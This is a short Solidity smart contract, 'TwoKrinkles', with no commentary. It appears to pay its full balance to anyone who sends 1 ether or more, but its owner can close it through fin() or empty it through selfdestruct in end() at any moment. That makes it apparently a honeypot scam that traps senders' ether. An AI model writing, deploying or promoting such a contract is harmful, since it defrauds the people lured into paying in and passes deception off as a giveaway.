pragma solidity ^0.4.25;

contract TwoKrinkles {
    function() public payable {}
    address Owner; bool closed = false;
    function own() public payable { if (0==Owner) Owner=msg.sender; }
    function fin(bool F) public { if (msg.sender==Owner) closed=F; }
    function end() public { if (msg.sender==Owner) selfdestruct(msg.sender); }
    function get() public payable {
        if (msg.value>=1 ether && !closed) {
            msg.sender.transfer(address(this).balance);
        }
    }
}